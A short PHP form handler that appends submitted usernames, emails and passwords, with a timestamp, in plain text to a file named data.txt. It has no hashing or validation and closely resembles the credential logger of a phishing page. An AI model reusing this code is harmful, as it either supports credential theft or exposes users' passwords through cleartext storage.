<?php
  $file = fopen("data.txt", "a") or die("Unable to open file!");
  $txt = "Username: " . $_POST['username'] . "\n";
  $txt .= "Email: " . $_POST['email'] . "\n";
  $txt .= "Password: " . $_POST['password'] . "\n";
  $txt .= "Date and Time: " . date("Y-m-d H:i:s") . "\n\n";

  fwrite($file, $txt);
  fclose($file);
?>